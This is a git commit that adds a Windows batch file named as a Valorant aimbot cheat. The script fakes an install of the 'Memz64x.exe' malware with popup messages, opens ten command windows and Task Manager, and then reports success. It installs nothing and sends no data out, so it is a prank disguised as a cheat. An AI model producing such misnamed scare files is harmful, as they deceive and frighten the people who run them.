03dcc7dbdfd55a84568c260606a82a69e2f5da57
LuisFernandoPBPereira <luisfernandopbp@gmail.com>
2022-03-01 21:04:24 -0300

    The file is finished

---
+++ HACK AIMBOT VALORANT.bat
@@ -0,0 +1,14 @@
+@echo off
+msg * "Installing Memz64x.exe..."
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start taskmgr.exe
+msg * "Memz64x.exe installed succesfully!"
